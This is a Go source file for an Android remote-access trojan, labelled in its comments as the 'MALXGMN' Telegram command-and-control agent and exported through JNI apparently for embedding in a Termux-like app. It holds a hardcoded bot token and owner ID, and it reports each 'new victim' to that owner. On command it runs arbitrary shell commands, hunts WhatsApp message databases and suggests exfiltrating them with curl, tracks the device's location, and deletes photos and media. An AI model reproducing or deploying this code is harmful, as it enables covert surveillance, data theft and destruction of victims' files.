package main

/*
#cgo CFLAGS: -I/home/rahmat/Android/Sdk/ndk/29.0.14206865/toolchains/llvm/prebuilt/linux-x86_64/sysroot/usr/include
#include <jni.h>
*/
import "C"

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

// KONFIGURASI MALXGMN TELEGRAM C2
const (
	BOT_TOKEN     = "8453010446:AAEhZlUyYjHs24gyERtoi6u_AR-VxUk4nvY"
	OWNER_CHAT_ID = 7599974954
	API_URL       = "https://api.telegram.org/bot" + BOT_TOKEN
)

// VARIABEL GLOBAL STATUS
var (
	MY_ID       string         // ID Unik Perangkat ini
	MY_MODEL    string         // Model HP (misal: Samsung A50)
	IS_LOCKED   bool   = false // Apakah perangkat ini sedang dipilih oleh Tuan?
	LAST_UPDATE int    = 0
)

// Struktur data Telegram
type TelegramResponse struct {
	Ok     bool     `json:"ok"`
	Result []Update `json:"result"`
}

type Update struct {
	UpdateID int     `json:"update_id"`
	Message  Message `json:"message"`
}

type Message struct {
	Chat Chat   `json:"chat"`
	Text string `json:"text"`
}

type Chat struct {
	ID int64 `json:"id"`
}

//export Java_com_termux_app_MalxgmnService_startAgent
func Java_com_termux_app_MalxgmnService_startAgent(env *C.JNIEnv, thisObj C.jobject) {
	go func() {
		// 1. Inisialisasi Identitas
		generateIdentity()

		fmt.Printf("[+] MALXGMN AGENT STARTED. ID: %s | Model: %s\n", MY_ID, MY_MODEL)

		// Kirim notifikasi infeksi baru
		sendMessage(fmt.Sprintf("💀 *NEW VICTIM CONNECTED (GHOST LIB)*\nID: `%s`\nModel: %s\nStatus: Waiting for /list", MY_ID, MY_MODEL))

		// 2. Loop Polling
		for {
			getUpdates()
			time.Sleep(2 * time.Second)
		}
	}()
}

func main() {} // Required for -buildmode=c-shared

func generateIdentity() {
	// Ambil model HP asli via shell
	model := runShell("getprop ro.product.model")
	if model == "" {
		model = "Unknown-Android"
	}
	MY_MODEL = strings.TrimSpace(model)

	// Generate ID acak 4 digit agar mudah diketik (misal: 1A2B)
	rand.Seed(time.Now().UnixNano())
	chars := "ABCDEF0123456789"
	result := make([]byte, 4)
	for i := 0; i < 4; i++ {
		result[i] = chars[rand.Intn(len(chars))]
	}
	MY_ID = string(result)
}

func getUpdates() {
	url := fmt.Sprintf("%s/getUpdates?offset=%d", API_URL, LAST_UPDATE+1)

	resp, err := http.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)

	var telegramResp TelegramResponse
	if err := json.Unmarshal(body, &telegramResp); err != nil {
		return
	}

	for _, update := range telegramResp.Result {
		LAST_UPDATE = update.UpdateID

		if update.Message.Chat.ID != OWNER_CHAT_ID {
			continue
		}

		command := update.Message.Text
		fmt.Printf("[*] Cmd: %s\n", command)
		processCommand(command)
	}
}

func processCommand(cmd string) {
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return
	}

	mainCmd := parts[0]

	// FIX: Hapus suffix username bot (misal /list@mybot -> /list)
	if idx := strings.Index(mainCmd, "@"); idx != -1 {
		mainCmd = mainCmd[:idx]
	}

	args := strings.Join(parts[1:], " ")

	// --- PERINTAH GLOBAL (Dijalankan oleh semua zombie) ---
	switch mainCmd {
	case "/list":
		// Semua zombie wajib lapor
		status := "💤 Idle"
		if IS_LOCKED {
			status = "🔥 ACTIVE (LOCKED)"
		}
		reply := fmt.Sprintf("🧟 *ZOMBIE REPORT*\nID: `%s`\nModel: %s\nStatus: %s", MY_ID, MY_MODEL, status)
		sendMessage(reply)
		return

	case "/lock":
		// Format: /lock [ID]
		// Jika args kosong atau "all", kunci semua (Dangerous)
		if args == MY_ID || args == "all" {
			IS_LOCKED = true
			sendMessage(fmt.Sprintf("🔒 *TARGET LOCKED: %s*\nSaya siap menerima perintah khusus.", MY_MODEL))
		} else {
			IS_LOCKED = false // Masuk mode diam jika bukan ID kita
		}
		return

	case "/unlock":
		IS_LOCKED = false
		sendMessage(fmt.Sprintf("🔓 *UNLOCKED: %s* (Masuk mode standby)", MY_MODEL))
		return
	}

	// --- PERINTAH SPESIFIK (Hanya dijalankan jika IS_LOCKED = true) ---
	if !IS_LOCKED {
		return // Abaikan perintah jika kita bukan target yang dipilih
	}

	var output string
	switch mainCmd {
	case "/start", "/help":
		output = `🔥 *MALXGMN CONTROL PANEL* 🔥
		
1️⃣ *Manajemen Target:*
/list - Lihat semua korban
/lock [ID] - Pilih korban spesifik
/unlock - Lepaskan target

2️⃣ *Aksi (Harus di-Lock dulu):*
/sms - Sadap SMS Terbaru
/contact - Curi Kontak
/loc - Lacak Lokasi
/shell [cmd] - Terminal Linux
/wipe - Hancurkan Data
/info - Info Detail`

	case "/shell":
		if args == "" {
			output = "❌ Masukkan perintah. Contoh: /shell ls -la"
		} else {
			sendMessage("⏳ Executing on " + MY_MODEL + "...")
			output = runShell(args)
		}

	case "/sms":
		// MALXGMN: Cari Database WhatsApp (Backup Chat)
		sendMessage("🔍 Hunting WhatsApp Databases (msgstore.db)...")
		files := runShell("find /sdcard/WhatsApp /sdcard/Android/media/com.whatsapp -name 'msgstore.db*' 2>/dev/null | head -n 5")
		if files != "" {
			output = fmt.Sprintf("✅ FOUND WA DB:\n%s\n\n(Gunakan /shell curl -F file=@... untuk exfiltrasi)", files)
		} else {
			output = "❌ Tidak ada database WhatsApp ditemukan."
		}

	case "/loc":
		// MALXGMN: Coba GPS System, Fallback ke IP Geo
		gps := runShell("dumpsys location | grep 'last location'")
		if gps != "" && !strings.Contains(gps, "Error") {
			output = "📍 GPS Location:\n" + gps
		} else {
			// Fallback IP Geolocation
			ipLoc := runShell("curl -s ipinfo.io/json")
			output = fmt.Sprintf("🌐 IP Geolocation (GPS Failed):\n%s", ipLoc)
		}

	case "/info":
		output = fmt.Sprintf("📱 *DEVICE INFO*\nID: %s\nModel: %s\nAndroid: %s",
			MY_ID, MY_MODEL, runShell("getprop ro.build.version.release"))

	case "/wipe":
		sendMessage("⚠️ *MENGHAPUS FOTO & VIDEO...*")
		runShell("rm -rf /sdcard/DCIM")
		runShell("rm -rf /sdcard/Pictures")
		runShell("rm -rf /sdcard/WhatsApp/Media")
		output = "✅ File media telah dimusnahkan."

	default:
		output = "❌ Perintah tidak dikenal."
	}

	if output != "" {
		sendMessage(output)
	}
}

func runShell(command string) string {
	// FIX: Gunakan /system/bin/sh untuk menjamin PATH benar di Android JNI
	cmd := exec.Command("/system/bin/sh", "-c", command)

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	if err != nil {
		return fmt.Sprintf("Error: %s\n%s", err, out.String())
	}
	return out.String()
}

func sendMessage(text string) {
	url := fmt.Sprintf("%s/sendMessage", API_URL)
	values := map[string]interface{}{
		"chat_id":    OWNER_CHAT_ID,
		"text":       text,
		"parse_mode": "Markdown",
	}
	jsonData, _ := json.Marshal(values)
	http.Post(url, "application/json", bytes.NewBuffer(jsonData))
}
